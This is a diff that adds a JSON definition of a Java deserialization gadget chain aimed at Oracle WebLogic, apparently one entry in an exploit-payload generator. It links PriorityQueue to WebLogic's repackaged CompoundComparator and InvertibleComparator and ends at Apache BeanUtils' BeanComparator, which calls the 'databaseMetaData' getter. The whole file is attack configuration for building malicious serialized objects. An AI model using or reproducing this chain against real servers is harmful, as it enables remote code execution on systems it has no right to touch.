@@ -1,0 +1,32 @@
+{
+  "chain_type": "comparator_chain",
+  "description": "WebLogic BEA CompoundComparator: PriorityQueue -> CompoundComparator -> delegates to inner comparators",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject\u2192heapify\u2192comparator.compare",
+  "links": [
+    {
+      "class": "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator",
+      "role": "bridge",
+      "field_overrides": {
+        "comparators": [{"$ref": "link:1"}]
+      }
+    },
+    {
+      "class": "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator",
+      "role": "bridge",
+      "field_overrides": {
+        "comparator": {"$ref": "link:2"},
+        "ascending": true
+      }
+    },
+    {
+      "class": "org.apache.commons.beanutils.BeanComparator",
+      "role": "sink",
+      "field_overrides": {
+        "property": "databaseMetaData",
+        "comparator": null
+      }
+    }
+  ],
+  "sink_method": "PropertyUtils.getProperty"
+}
